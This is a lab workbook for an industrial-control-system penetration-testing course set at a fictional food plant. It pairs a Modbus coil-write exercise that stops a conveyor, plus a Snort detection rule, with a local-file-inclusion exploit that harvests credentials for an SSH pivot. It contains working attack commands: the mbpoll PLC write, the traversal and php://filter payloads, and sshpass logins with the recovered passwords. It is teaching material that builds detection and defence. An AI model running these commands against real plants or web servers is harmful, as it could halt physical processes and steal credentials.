docs.text:
• Identify the Modbus coil mapped to the conveyor run command
  • Write the conveyor coil to its stop state and observe the transition
  • Read the conveyor transition counter from input register 30004
  • Capture the coil write on the wire and read its function code and target coil address
  • Draft a Snort rule that alerts on a Modbus coil write to the conveyor coil, and explain every field
  • Compose the flag describing the attack and detection rule
Detail Value Difficulty Intermediate (independent) Estimated Time 45 to 60 minutes Prerequisites Exercises 3.1, 3.2, 3.3 Flag Source Found? OCR{<coil_address>_<state>_<rule_intent>} Composite coil address, value, and rule intent

docs.title: Background: Modbus Coils and Function Code 5
docs.text:
Coils are single-bit outputs in the Modbus data model. A coil represents a discrete on/off signal: a valve is open or closed, a relay is energized or not, a motor is commanded to run or stop. Unlike holding registers (which are 16-bit words), coils are addressed individually.

Function Code Name Direction 1 Read Coils Client reads coil states 5 Write Single Coil Client writes one coil 15 Write Multiple Coils Client writes a contiguous block of coils

A Write Single Coil (FC5) request sets a single coil to ON (0xFF00) or OFF (0x0000). The wire encoding of the PDU is simple:

FC (0x05) | coil address (2 bytes) | coil value (2 bytes)

The MC-7200 register map on the docs portal documents the first four coils as:

Coil (Modbus address) Wire address Meaning 00001 0 line_run master enable 00002 1 conveyor_run conveyor motor command 00003 2 oven_enable burner enable 00010 9 e_stop emergency stop (latching)

The conveyor run coil is Modbus coil address 00002, wire address 1. An FC5 write of 0x0000 to wire address 1 tells the conveyor motor to stop. A follow-up write of 0xFF00 restarts it. An attacker who toggles the coil in this pattern causes the observed "stops for a few seconds and starts again" symptom. The 0x0000 value and the 0xFF00 value are the two states the run coil carries on the wire, and you confirm which one the attacker drives it to by reading the coil back after the write.

docs.title: Input Register 30004: Transition Counter
docs.text: The MC-7200 firmware increments an internal counter each time the conveyor run coil changes state. The counter is exposed read-only in input register 30004 (wire address 3, function code 4). A healthy operational pattern keeps the counter stable; an attack pattern shows the counter jumping by two each round trip (ON-to-OFF plus OFF-to-ON).

docs.title: Tools You Will Need
docs.text:
Tool Purpose Check mbpoll Modbus/TCP command-line client: read coils, write a single coil, read the input register, no code which mbpoll Wireshark / tshark Capture the coil write and decode its Modbus function code and target coil on the wire tshark --version Snort (or Suricata) The IDS engine the rule runs in; used to reason about the signature and, if available, test it against a capture snort --version curl Confirming the operator HMI reports the conveyor stop state curl --version

The detection half of this exercise lives in tshark and the IDS, not in a script.

docs.title: Stage 1: Read the Current State
docs.text:
Pull the coil states and the transition counter with mbpoll. There is no client to write; one command per object covers it. Record the baseline values so you can prove the delta after the attack.

mbpoll selects the Modbus object by -t: -t 0 is coils (function codes 1 and 5), -t 3 is input registers (function code 4). The -r option is 1-based, so it counts from 1 while Modbus wire addresses count from 0. The conveyor coil sits at wire address 1, which is -r 2; the transition counter sits at wire address 3 in the input-register space, which is -r 4. Read the first three coils as a block (-r 1 -c 3) so you capture line_run, conveyor_run, and oven_enable in one transaction.

Kali

# Read coils 00001..00003 (line_run, conveyor_run, oven_enable)
mbpoll -1 -a 1 -t 0 -r 1 -c 3 plc1.masa.local
# Read the transition counter in input register 30004 (wire address 3 -> -r 4)
mbpoll -1 -a 1 -t 3 -r 4 -c 1 plc1.masa.local
-1 polls once and exits, -a 1 is the Modbus unit id, -t 0 selects coils, -r 1 -c 3 reads the three-coil block starting at coil 00001, and the second command switches to -t 3 (input registers) at -r 4 for the counter. Port 502 is the default.

Record the conveyor coil value (the second coil in the block) and the counter value. Both are your before picture.

docs.title: Stage 2: Capture the Write, Then Reproduce It
docs.text:
Detection is the point of this exercise, so start the capture before you send the write. Sniff TCP port 502 on the interface that reaches the PLC. Run the capture in one terminal and the write in another, or save the capture and open it in Wireshark afterward.

Start a capture scoped to the PLC and Modbus port:

Kali

# Terminal 1: capture the Modbus exchange to a file
sudo tshark -i any -f "tcp port 502 and host plc1.masa.local" -w /tmp/conveyor-write.pcapng

With the capture running, send the single coil write. mbpoll writes a coil when you give it a value argument after the address. The value is 0 or 1; the off state is 0, which mbpoll encodes on the wire as the FC5 value 0x0000. The conveyor coil is wire address 1, so the write target is -r 2.

Kali

# Terminal 2: write the conveyor run coil to its stop value
mbpoll -1 -a 1 -t 0 -r 2 0 plc1.masa.local
Same flags as the read, with one difference: the trailing 0 is the value to write, which turns this into a Write Single Coil (FC5) rather than a read. -r 2 is coil wire address 1 (the conveyor run coil) in mbpoll's 1-based numbering.

Now confirm the effect. Read the coil back and read the counter again:

Kali

mbpoll -1 -a 1 -t 0 -r 1 -c 3 plc1.masa.local
mbpoll -1 -a 1 -t 3 -r 4 -c 1 plc1.masa.local

The conveyor coil now reads its stop value and the transition counter has moved up by one. Stop the tshark capture (Ctrl+C in Terminal 1) so the write is recorded for the next stage.

docs.title: Stage 3: Read the Write Off the Wire
docs.text:
Open /tmp/conveyor-write.pcapng in Wireshark and set the display filter to the coil-write function code. Wireshark decodes the Modbus layer, so you read the function code and the target coil address straight from the packet rather than trusting the tool that sent it.

Display filter What it shows modbus every Modbus PDU in the capture modbus.func_code == 5 only Write Single Coil requests modbus.func_code == 15 only Write Multiple Coils requests (the evasion path)

Filter to modbus.func_code == 5 and select the write request. The Modbus tree shows the Function Code (5, Write Single Coil), the Reference Number (the zero-based wire address of the coil you wrote), and the Data value (0x0000 for the stop state, 0xFF00 for run). The Reference Number is the coil identity your flag needs, and the Data value is the state token.

You can read the same fields without the GUI:

Kali

tshark -r /tmp/conveyor-write.pcapng -Y "modbus.func_code == 5" \
  -T fields -e modbus.reference_num -e modbus.data
-r reads the saved capture, -Y applies the same display filter as the GUI, and -T fields -e ... prints just the coil reference number and the written value so you can confirm the wire address and the state in one line.

docs.title: Stage 4: Confirm the HMI Shows the Stall
docs.text:
The primary confirmation is visual. Open http://hmi.masa.local/ in a browser (HMI IP from the Exercise Network panel, port 80); the Tortilla Line cockpit shows the conveyor stopped and the line-state / interlock change your coil write drove, the same operator cockpit pictured earlier in this workbook. The conveyor indicator sits in gray with the belt animation dropped.

Cross-check the same state from the CLI. Fetch the state JSON and confirm it reports the same conveyor stop the cockpit shows.

Kali

curl -s http://hmi.masa.local/api/state
The response is JSON. Read the conveyor_run field; it reports the run state the coil now holds, matching both what you wrote and what the cockpit displays.

When the run coil drops to its stop value the cockpit drops the conveyor belt animation and clears the conveyor run indicator, and the line alarm surface lights the same way it does for any unsafe write on the Plant 1 cockpit. The shot below shows that alarm surface at full tilt during a sibling burn trip on the same line, so you can see exactly which banners and gauges the night-shift operators should have flagged instead of opening a motor maintenance ticket.

The Plant 1 cockpit in its alarm state: the safety banner fires, the affected element turns red, and the line drops out of RUNNING. Your conveyor coil write drives the same alarm surface from the conveyor element, which is the on-screen signal the operators missed for weeks while the fault sat in the maintenance queue.

docs.title: Stage 5: Restore Operations, Then Draft and Explain the Rule
docs.text:
Write the coil back to its run value to restore operations. The run state on the wire is 0xFF00, which mbpoll writes when you pass the value 1.

Kali

mbpoll -1 -a 1 -t 0 -r 2 1 plc1.masa.local
Same write form as the attack, with the value 1 instead of 0, so the conveyor motor is commanded back to run before you leave.

Now draft the Snort rule that catches the next instance. Save it in a scratch file such as /tmp/plant1_conveyor.rules:

Drafted Snort rule

alert tcp !$HMI_NET any -> $PLC_NET 502 (msg:"ICSPT MODBUS WRITE COIL conveyor FROM UNTRUSTED SOURCE"; flow:to_server,established; content:"|00 05 00 01|"; offset:7; sid:1000001; rev:1;)

Explain every field before you hand it over. A rule you cannot defend field by field is a rule you cannot tune, so walk through it the way the SOC will ask you to. The fields you derived from the capture in Stage 3 are the content match and the offset.

Field Value in this rule What it does and why Action alert Generate an alert event and log the packet; it does not block. A protocol-aware firewall would drop, but a SOC detection rule alerts Protocol tcp Modbus/TCP rides on TCP, so the rule inspects the TCP stream Source !$HMI_NET any Source address !$HMI_NET (any host NOT in the HMI subnet) and any source port. The negation is what makes legitimate operator writes silent and outside writes loud Direction -> Match traffic flowing from the source toward the destination only Destination $PLC_NET 502 The PLC subnet on the Modbus port. Limits the rule to traffic actually aimed at a PLC's Modbus listener msg descriptive text The alert label the SOC sees. Name the coil and the untrusted source so a triaging analyst knows what fired without reading the rule body flow to_server,established Only inspect client-to-server packets on an already-established TCP session. Drops out half-open scans and server responses, cutting false positives content "\|00 05 00 01\|" The byte pattern that defines a coil-write to this coil. The bytes are the last length byte of the Modbus header (00), the function code (05 = Write Single Coil), and the two-byte coil reference number (00 01 = wire address 1, the conveyor coil). Match these four bytes and you have an FC5 write to exactly this coil offset 7 Start the content match 7 bytes into the TCP payload. The Modbus MBAP header is 7 bytes (transaction id, protocol id, length, unit id), so byte 6 is the last length byte and byte 7 begins the PDU. Anchoring at offset 7 means the four-byte pattern lands on header-length-byte + function-code + coil-address and nowhere else, so a coil value that happened to contain 00 05 00 01 in its data cannot trigger a false match sid 1000001 Signature id. Local rules use the 1000000+ range so they never collide with vendor rule ids rev 1 Revision number. Bump it every time you edit the rule so the engine reloads the new version

The content bytes are not magic numbers: you read the function code (05) and the coil reference number (00 01) straight off the Wireshark decode in Stage 3. The rule is the wire capture turned into a standing signature.

Suricata equivalent

Suricata parses the Modbus layer, so you can write the same intent against decoded keywords instead of a raw byte match: alert modbus !$HMI_NET any -> $PLC_NET 502 (msg:"Modbus write to conveyor coil from untrusted source"; app-layer-protocol:modbus; ...; sid:1000001; rev:1;). The byte-offset Snort form above is portable to either engine and makes the wire structure explicit, which is why it is the one to learn first.

docs.title: Stage 6: Compose the Flag
docs.text:
The flag is a compact descriptor of what you proved and what you built. You already hold every token:

  • The first token is the conveyor coil identity. You confirmed it from the MC-7200 register map and saw the same coil reference number decoded in the Stage 3 capture
  • The second token is the run-coil value the attacker drives it to. You read it back after the write and saw it in the Modbus Data field on the wire
  • The last two tokens name the detection rule's intent: the protocol it watches and the action it takes when an unauthorized coil write appears

Assemble the three into the template OCR{<coil_address>_<state>_<rule_intent>} and submit it in the platform flag box. The platform validates the composite immediately, so the finished string is not printed here.

Detection summary (fill in from your own work):

Field Value Coil wire address Run-coil value at trip Rule SID Rule content match

Flag: _________

docs.title: Output Interpretation
docs.text:
• A transition counter that jumps by 1 means the attacker toggled the coil once. A jump of 2 means one full stop-then-run cycle, which matches the "stops for a few seconds and starts again" symptom
  • A counter that climbs every hour but never steadies indicates sustained automated toggling, which is exactly the fingerprint of a scripted attacker
  • The Snort content match |00 05 00 01| only fires on FC5 writes targeting coil wire address 1. Writes to other coils (for example |00 05 00 02| for the oven enable) will not trigger this rule. That is intentional; you can layer additional SIDs for other sensitive coils
  • The rule uses offset:7 because the four-byte content match starts at the last byte of the MBAP length (0x00) and covers the first three bytes of the PDU (0x05 0x00 0x01): the function code and the coil reference number you read off the wire in Stage 3
  • In Wireshark, modbus.func_code == 5 isolates the offending Write Single Coil request and modbus.func_code == 15 reveals the Write Multiple Coils evasion variant. The function-code filter is how you separate the attack from the steady stream of FC1 and FC4 polling the HMI generates

docs.title: Analysis Questions
docs.text:
1. Why does the rule use !$HMI_NET rather than a specific source IP?

Reveal answer

Source IP allowlists break every time the HMI host moves, gets a new DHCP lease, or is replaced. Negating the HMI subnet is more resilient: as long as the HMI stays inside a known subnet, any FC5 write to the conveyor coil from outside that subnet will alert. In a real deployment you would define $HMI_NET as the operations VLAN address block in the Snort configuration.

2. How would you extend this detection to cover the full write function code family (FC5, FC6, FC15, FC16)?

Reveal answer

Write four rules, one per function code, with appropriate content matches for the byte immediately after the unit identifier. Some SOC platforms let you combine them into a single rule with a regex or a content-list match, but four targeted rules are easier to reason about and tune for false positives.

3. Could an attacker evade this rule by writing to coil 00002 through function code 15 (Write Multiple Coils) instead of 5?

Reveal answer

Yes. FC15 writes a contiguous block of coils starting at a specified address. An attacker who writes a two-coil block starting at address 1 would toggle the conveyor coil without hitting the FC5 content match. The defense is to add a companion rule for FC15 that matches on the starting address. The general pattern in detection engineering is the same: every rule you write exposes at least one evasion path, and your ruleset must be audited for coverage.

4. Why is the transition counter at 30004 a better investigation signal than the coil state itself?

Reveal answer

Coil state is instantaneous. If the attacker toggles the coil off and back on within a single HMI polling window, the operator never sees the state change. The transition counter is monotonic: every toggle increments it by one regardless of how fast the change happens. A counter that jumps when the HMI polls are quiet is a strong indicator of out-of-band writes.

docs.title: Defensive Recommendations to Masa
docs.text: Finding Risk Mitigation Unauthenticated FC5 writes accepted from any host on the operations VLAN Critical Deploy the Snort rule drafted above, and plan toward a protocol-aware firewall that drops writes from non-HMI sources Conveyor transition counter is not monitored Medium Add the counter to the historian scrape and alert on deltas above a baseline HMI subnet not formally defined in plant documentation Low Document the operations VLAN as the authoritative $HMI_NET for detection rules No companion rule for FC15 writes Medium Author a follow-up Snort rule in the same pattern for function code 15

docs.title: Key Takeaways
docs.text:
• Modbus coils and Function Code 5 (Write Single Coil) are a first-class write attack surface alongside holding registers
  • Transition counters expose attacks that operator polling intervals would hide
  • A single Snort content match on the ADU prefix is enough to detect the simplest form of this attack
  • Every detection rule has evasion paths. Audit rulesets for function code coverage, not just address coverage
  • Reversibility (restoring the coil to ON after the test) is the same operational discipline you used in Exercise 3.3

docs.title: Exercise ICSPT-2.1: From Phish to Foothold
Engagement Status
docs.text:
Client Masa Foods, Inc. (fictional) Role OT Security Engineer, Plant 1 Phase Discovery Enumeration Exploitation Reporting

What you know so far: You have completed all four Phase 1 (Level 1) exercises: Purdue-level mapping, asset inventory, PCAP decoding, and traffic attribution. You have never left the Plant 1 operations VLAN. Reyna Alvarado now wants to see the enterprise-to-OT pivot that Corporate IT has warned about.

docs.title: Environment Checklist
docs.text:
Every ICSPT exercise assumes you read the Before-You-Begin section in Exercise 1.1 (Touring Masa Foods) first. If you have not, open that page now: it explains the two attacker-host options (your own Kali over VPN, or the browser-mounted RangeBox) and walks you through the one-time /etc/hosts setup that lets you call every target by its friendly name.

Exercise 2.1 introduces two new hosts that are not part of the Plant 1 stack from Level 1: a corporate intranet at corpweb.masa.local and the Plant 1 jump host at jumpserver.masa.local. Add them to /etc/hosts now using the IPs from the Exercise Network panel (labels corpweb and jumpserver):

Kali (one-time for Exercise 2.1)

# Replace the example IPs with the values from the Exercise Network panel.
# Exercise 2.1 uses offsets .8 (corpweb) and .9 (jumpserver).
sudo tee -a /etc/hosts <<'HOSTS'
10.100.42.8   corpweb.masa.local
10.100.42.9   jumpserver.masa.local
HOSTS

Confirm name resolution and reachability:

Kali

getent hosts corpweb.masa.local jumpserver.masa.local
nc -zv corpweb.masa.local 80
nc -zv jumpserver.masa.local 22

Expected: two name-to-IP lines, succeeded! on HTTP/80 for corpweb, and succeeded! on SSH/22 for jumpserver. If either probe fails, the lab is not Running yet; fix connectivity (VPN tunnel or RangeBox + exercise relaunch) before continuing.

docs.title: Scenario
docs.text: Corporate IT has been warning Masa leadership for a year that the in-house intranet application "has some old code in it." The warnings have gone unheeded. Reyna Alvarado wants concrete evidence for the quarterly review: a demonstration that a phishing click on a single Masa employee's laptop could reach a Plant 1 jump host in under an hour.

docs.title: Why this matters
docs.text:
Executives do not believe that a phishing click on a finance laptop can reach a tortilla oven. The cognitive distance between "Dana in accounting clicked a link" and "someone is writing to an OT controller" is too long to cross in a board meeting. Every pen test that tries to explain the pivot chain in a slide deck loses. Every pen test that shows the pivot chain end to end in a live demo wins.

The pivot demo is the single most valuable pen-tester deliverable for an OT client that has no segmentation between IT and OT. Three concrete outcomes hinge on whether you can execute it cleanly:

  • Segmentation budget approval. The number one reason Masa has no DMZ between corporate and operations is that nobody has ever put a working pivot chain in front of the CFO. Once you do, the cost of a dedicated OT firewall stops being theoretical and starts being compared against the cost of the demo you just ran.
  • Vendor-access policy reform. The ot_vpn_creds.pdf file you are going to find in the intranet tree exists because Corporate IT wanted to make life easy for OT engineers and stored credentials in the shared filesystem. Reform conversations never happen until someone demonstrates that storing credentials in a shared filesystem has a cost. You are about to provide the demonstration.
  • Adversary playbook mapping. Stuxnet, TRITON, and Industroyer all used variants of exactly this pivot chain: compromised IT endpoint, credential harvest from a shared store, SSH or RDP pivot into an engineering workstation, PLC write. If you can execute the chain in under an hour on a plant that thought it was safe, any real adversary with budget can execute it in under a day.

You start with network access to the corporate intranet at http://corpweb.masa.local/. The application has a Local File Inclusion (LFI) vulnerability in its page loader. Your job is to exploit the LFI, read a credential file that Corporate IT stored inside the intranet tree, and use those credentials to SSH into the Plant 1 jump host at jumpserver.masa.local. Once logged in as the OT engineering account, pull the handoff-notes file that the outgoing engineer left for the new hire. The file contains the flag.

You will not interact with any PLC during this exercise. The pivot chain stops at the jump host.

Credentials in scope Username Password Where it is used Jump host SSH account ot_engineer masa_ot_2025 SSH login after you harvest it from the LFI Plant 1 HMI account plant_op masa_op_2025 Reference only, not used here

docs.title: Objectives
docs.text:
• Enumerate the Masa Foods corporate intranet and locate the vulnerable page loader
  • Exploit the LFI to read arbitrary files on the corpweb container
  • Recover OT engineering credentials from the leaked ot_vpn_creds.pdf file
  • SSH into jumpserver.masa.local as the recovered user
  • Read the OT security handoff notes file and submit the flag
Detail Value Difficulty Intermediate Estimated Time 45 to 75 minutes Prerequisites All Phase 1 exercises (1.1 through 2.2) Flag Source Found? OCR{...} OTSecurity-handoff.txt on the jump host

docs.title: Background: Local File Inclusion
docs.text:
Local File Inclusion is one of the oldest still-exploited classes of web vulnerabilities. In PHP it occurs when an application passes user-controlled input directly to include(), require(), or readfile() without validating the path. The classic pattern looks like:

$page = $_GET['page'];
include("pages/" . $page . ".php");

Any user who can control the page query parameter can traverse out of the pages/ directory using ../ and include arbitrary files on the filesystem. If the application also has a fallback branch that reads non-PHP files via readfile() when the .php suffix does not exist, the attacker can pull plain text files back to the browser.

LFI is a foothold, not a shellcode delivery mechanism on its own. In this exercise LFI is enough to harvest credentials stored in a file inside the web root, and the credentials are the real prize. In real engagements LFI chains often follow one of three paths:

  1. Config file harvesting. Read application config files (database credentials, API keys, admin passwords) to pivot laterally
  2. Log poisoning. Inject PHP into a log file (access log, error log, mail log) and then include the log file, turning LFI into RCE
  3. PHP wrappers. Use php://filter or data:// to bypass filters and read or execute arbitrary PHP

Today's exercise is path 1. The intranet team stored a plaintext credential file in config/ next to the page loader. Corporate IT reviewed the code months ago, flagged it, and was told "we will fix it next sprint." The file is still there.

Why the intranet team put credentials in a file

Real plants do this for reasonable-sounding reasons: the intranet application needs to link out to plant-side services, the plant-side services need shared credentials, and the intranet team does not want to store secrets in a database they do not own. The fix is a secret manager, not a text file. The practical reality is that text files on the filesystem are common in OT environments and are always worth checking when you find an LFI.

docs.title: Tools You Will Need
docs.text:
Every command in this walkthrough runs from your Kali. All five tools below come with a standard Kali image.

Tool Purpose Install Check nmap Port scanning nmap --version curl Issue the LFI request and download responses curl --version Web browser Explore the intranet pages by hand Firefox or Chromium ssh Pivot into the jump host after credential recovery ssh -V sshpass Pass the recovered password non-interactively (optional) sshpass -V

docs.title: Step 1: Confirm corpweb Is Reachable and Running
docs.text:
After finishing the Environment Checklist above, confirm the intranet loads.

Kali

nmap -n -Pn -p 80,443 corpweb.masa.local
curl -s -o /dev/null -w 'HTTP %{http_code}\n' http://corpweb.masa.local/
Expected output 

PORT   STATE  SERVICE
80/tcp open   http
443/tcp closed https

HTTP 302
The 302 redirect comes from index.php sending you to include.php?page=home. Follow the redirect in your browser or pass -L to curl.

docs.title: Step 2: Explore the Intranet by Hand
docs.text:
Open http://corpweb.masa.local/ in your browser (Firefox or Chromium works fine). Click through the navigation links and watch the address bar: every page loads via ?page=<name> on the URL. Right-click and choose View Page Source, or press Ctrl+U, to read the raw HTML and confirm the loader pattern. Anything the curl block below does, you can also do straight in the browser, because the page parameter is a simple GET. The terminal version just pulls all four headings at once for a quick survey.

Kali

curl -s "http://corpweb.masa.local/include.php?page=home"     | grep -o '<h2>[^<]*</h2>'
curl -s "http://corpweb.masa.local/include.php?page=about"    | grep -o '<h2>[^<]*</h2>'
curl -s "http://corpweb.masa.local/include.php?page=contact"  | grep -o '<h2>[^<]*</h2>'
curl -s "http://corpweb.masa.local/include.php?page=announcements" | grep -o '<h2>[^<]*</h2>'
Expected output 

<h2>Welcome to the Masa Foods Intranet</h2>
<h2>About Masa Foods</h2>
<h2>Contact</h2>
<h2>Announcements</h2>
All four navigation links work. The announcements page is the most interesting one: it mentions "Jump host access is handled through the Corporate IT ticket queue and credentials are stored in the usual config location." That sentence is your hint that a credential file lives somewhere under the web root.

docs.title: Step 3: Probe for the LFI
docs.text:
The classic first test is ../../../etc/passwd. If the application is vulnerable, the response includes the file's contents. Because the LFI lives in a GET parameter, you have three equivalent ways to send it, and a real assessment uses whichever fits the moment:

  • Browser: paste http://corpweb.masa.local/include.php?page=../../../etc/passwd into the address bar and read the result on the page. If the browser tries to render it, press Ctrl+U to see the raw text.
  • Burp Suite: intercept any page request, send it to Repeater (Ctrl+R), change the page value to the traversal string, and resend. Repeater is the standard tool for iterating on a web payload, and it keeps a history of every variant you try.
  • curl: the command below, which is handy when you want to grep the response or script the request.

Kali (curl option)

curl -s "http://corpweb.masa.local/include.php?page=../../../etc/passwd" | grep -E 'root:|www-data:'
Expected output 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
The response confirms the LFI. Notice the application is running as www-data, which is a normal PHP-FPM setup.

Why the .php suffix does not stop you

The vulnerable loader first tries pages/<page>.php. If that file does not exist, it falls back to reading pages/<page> directly with readfile(). So ?page=../../../etc/passwd hits the fallback branch: there is no pages/../../../etc/passwd.php file, so the loader tries pages/../../../etc/passwd which resolves to /etc/passwd.

docs.title: Step 4: Find and Download the Credential PDF
docs.text:
Announcements mentioned a "config location." Standard PHP application layout puts config files in config/ at the same level as the page loader. First look at what lives in the config directory by reading the intranet.ini file Corporate IT mentions in the announcements.

Kali

curl -s "http://corpweb.masa.local/include.php?page=../config/intranet.ini" | grep -A 10 "<pre>"

Two PDF files sit in /config/ next to intranet.ini: acceptable_use_policy.pdf and ot_vpn_creds.pdf. The file names tell you which is the distractor (the AUP) and which is the credential target. Download the credential PDF. You can navigate the browser straight to http://corpweb.masa.local/include.php?page=../config/ot_vpn_creds.pdf and the intranet streams it as a PDF your browser opens or saves; or use curl to grab the raw bytes:

Kali (curl option)

# The corpweb intranet has a binary-aware fallback that streams
# PDFs as application/pdf with the right Content-Disposition header,
# so curl downloads the raw bytes instead of a template-wrapped
# preview. Save to a scratch path and sanity-check the type.
curl -s -o /tmp/ot_vpn_creds.pdf \
  "http://corpweb.masa.local/include.php?page=../config/ot_vpn_creds.pdf"
file /tmp/ot_vpn_creds.pdf
ls -la /tmp/ot_vpn_creds.pdf
Expected output 

/tmp/ot_vpn_creds.pdf: PDF document, version 1.4, 1 page(s)
-rw-r--r-- 1 kali kali 2284 Apr 11 23:00 /tmp/ot_vpn_creds.pdf
A valid PDF, 2284 bytes. Now extract the text.

Kali

pdftotext /tmp/ot_vpn_creds.pdf -
Expected output (trimmed) 

Masa Foods Corporate IT
Plant 1 Remote Access Credentials
Document classification: INTERNAL. Do not share outside Masa OT engineering.
...

Jump host (Plant 1 operations VLAN)
Host: jumpserver.masa.local
Port: 22

OT engineering account (read-only PLC access)
Username: ot_engineer
Password: masa_ot_2025

Incident response: contact help@masa.local
The username and password are on the last two lines. Record them in your engagement log.

About the distractor

If you downloaded acceptable_use_policy.pdf by mistake, pdftotext will show an IT policy signed by Marcus Holloway with nothing useful in it. Both files live at the same LFI path prefix; reading the file names before downloading saves you one pdftotext round-trip. In a real engagement, a credential-bearing PDF hides in a folder next to three or four harmless lookalikes. Practice the habit of reading names first.

docs.title: Step 5: Pivot via SSH into the Jump Host
docs.text:
Use the recovered credentials to SSH into jumpserver.masa.local. The jump host only allows password authentication as the ot_engineer user.

Kali

# Non-interactive version for quick testing
sshpass -p 'masa_ot_2025' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ot_engineer@jumpserver.masa.local 'whoami; id; pwd; ls -la'
Expected output 

Warning: Permanently added 'jumpserver.masa.local' to the list of known hosts.
ot_engineer
uid=1000(ot_engineer) gid=1000(ot_engineer) groups=1000(ot_engineer)
/home/ot_engineer
total 16
drwxr-sr-x    3 ot_engin ot_engin      4096 Apr 11 23:00 .
drwxr-xr-x    3 root     root          4096 Apr 11 23:00 ..
-rw-------    1 ot_engin ot_engin       710 Apr 11 23:00 OTSecurity-handoff.txt
drwx------    2 ot_engin ot_engin      4096 Apr 11 23:00 .ssh
The handoff file is mode 600, readable only by ot_engineer. SSH as that user is the only way to see the contents.

docs.title: Step 6: Read the Handoff File and Capture the Flag
docs.text:
Kali

sshpass -p 'masa_ot_2025' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ot_engineer@jumpserver.masa.local 'cat OTSecurity-handoff.txt'
Expected output 

OT Security Handoff Notes (CONFIDENTIAL)
=========================================

Plant 1 Jump Host Access Token:
OCR{...}

Next steps for the new OT security engineer:
...
The access token is your flag. Submit it in the OCR platform.

docs.title: Step 7: Record Your Findings
docs.text:
Fill in the pivot chain table below.

Pivot chain:

Step Target Technique Evidence captured 1 corpweb.masa.local 2 corpweb filesystem 3 jumpserver.masa.local 4 ot_engineer home directory

The flag is the OCR{...} string inside the handoff-notes file you read from the OT engineer's home directory on the jump server. Submit it exactly as it appears in the file.

Flag: OCR{________________}

docs.title: Output Interpretation
docs.text:
• A 302 redirect from the intranet index to include.php?page=home is a clean signal that every page flows through the vulnerable loader
  • The /etc/passwd response with www-data confirms the LFI reaches the whole filesystem, not just the intranet tree. Real engagements use this to enumerate the host OS, find other users, and spot container escape hints
  • readfile() style LFI wraps the output in <pre> tags in this intranet template. That is a quirk of the specific application, not a general rule
  • The 600 mode on OTSecurity-handoff.txt is the reason SSH is required. In a real engagement you would note this as a "defense-in-depth worked" finding: even with LFI on the web host, this specific file was only accessible via a separate authentication layer

docs.title: Analysis Questions
docs.text:
1. Why did the intranet team store credentials in a plaintext file instead of a secret manager or an environment variable?

Reveal answer

Several reasons, all common in the field: the intranet team did not own the plant-side services and could not propagate environment variables between IT and OT teams cleanly; the intranet codebase predated the company's secret manager rollout; nobody wanted to be the person who broke the intranet on a Friday afternoon to migrate the credentials. None of those reasons are good, but all of them are realistic. The fix is to rotate the credentials as soon as the LFI is patched, move the secret into a vault, and audit the intranet for other plaintext secrets.

2. The LFI reached /etc/passwd via ../../../etc/passwd. How many directory traversal hops are needed to reach an absolute path like /etc/passwd from the PHP loader's starting directory?

Reveal answer

The loader's base is /var/www/html/pages/. Three .. hops move up to /, then etc/passwd finishes the path. The actual count depends on the exact starting directory; /etc/passwd on this container works with anything from three to six hops because PHP normalizes the path.

3. Could you have reached the same credentials via php://filter?

Reveal answer

Yes. ?page=php://filter/convert.base64-encode/resource=../config/ot_vpn_creds.pdf would return a base64-encoded blob that decodes to the same PDF bytes. The wrapper approach is more useful when the target file contains PHP tags that would be executed by include(), or when the webserver's fallback branch mangles binary output. For the corpweb intranet the binary-aware fallback in include.php already serves the PDF with the right Content-Type, so direct path traversal is the short path. Base64 wrappers become necessary on real CMS engines that wrap every output in HTML.

4. The handoff file has mode 600. Why did SSH succeed even though a random web user cannot reach the file via LFI?

Reveal answer

The LFI runs as www-data, which is not ot_engineer, so the 600 permission blocks the LFI path entirely. SSH succeeds because ot_engineer authenticates as the actual file owner, and the OS enforces the same permission bit in the owner's favor. Mode 600 is a defense-in-depth control that successfully prevented a web-side compromise from reading the file.

docs.title: Defensive Recommendations to Masa
docs.text: Finding Risk Mitigation LFI in include.php?page= parameter Critical Sanitize the $page parameter against a hardcoded allowlist of page names, and fail closed on anything else Plaintext OT credentials in the intranet tree Critical Move the file to a secrets manager and rotate the credentials (they are now burned) Jump host password authentication High Switch to SSH public-key authentication, disable password auth in sshd_config No logging of include.php requests with traversal patterns Medium Deploy a web application firewall rule or log analysis job that alerts on ../ in the query string No segmentation between the corporate network and the Plant 1 operations VLAN Critical Place the jump server behind a dedicated OT firewall with allowlisted source IPs from the engineering workstation subnet only

docs.title: Key Takeaways
docs.text:
• Local File Inclusion is still common in plant-adjacent web applications because the code is old, the team is small, and the pressure to ship is high
  • LFI is a foothold, not a shellcode delivery mechanism. The value is in what files you can read with it
  • Credential files inside the web root are the first thing to check after LFI is confirmed. Application config directories are always worth enumerating
  • Network pivot via SSH is the canonical way to cross from corporate to OT in a real engagement, and the jump host is the single most important host to harden
  • Defense-in-depth (file permissions on the jump host) can prevent a web-side compromise from escalating into an OT compromise, but only if the defender has the discipline to keep both layers tight

docs.title: Engagement Status
docs.text:
Client Masa Foods, Inc. (fictional) Role OT Security Engineer, Plant 1 Phase Discovery Enumeration Exploitation (independent) Reporting

What you know so far: You have crossed the corporate-to-OT boundary once, in Exercise 2.1, by exploiting LFI and pivoting via SSH. Exercise 2.2 is the forensic flip side: a contractor reached the OT side through the front door, and the operations switch SPAN port captured every packet of his overnight session. Your job is to read the capture and quantify what happened.

docs.title: Environment Checklist
docs.text:
Every ICSPT exercise assumes you read the Before-You-Begin section in Exercise 1.1 (Touring Masa Foods) first. If you have not, open that page now: it explains the two attacker-host options and walks you through the one-time /etc/hosts setup that lets you call every target by its friendly name.

Exercise 2.2 introduces one new host: the seized contractor laptop at ctr-laptop.masa.local, which hosts the packet capture Ben pulled from the switch. The Plant 1 PLCs, mixer, and historian are also in scope. Add the laptop entry to /etc/hosts:

Kali (one-time for Exercise 2.2)

# Replace the example IP with the ctr-laptop value from the
# Exercise Network panel on the OCR track page.
sudo tee -a /etc/hosts <<'HOSTS'
10.100.42.10   ctr-laptop.masa.local
HOSTS

Confirm name resolution and reachability:

Kali

getent hosts ctr-laptop.masa.local plc1.masa.local
nc -zv ctr-laptop.masa.local 22

Expected: two name-to-IP lines and succeeded! on SSH/22 for the contractor laptop. Fix connectivity before continuing if either fails.

docs.title: Scenario
docs.text:
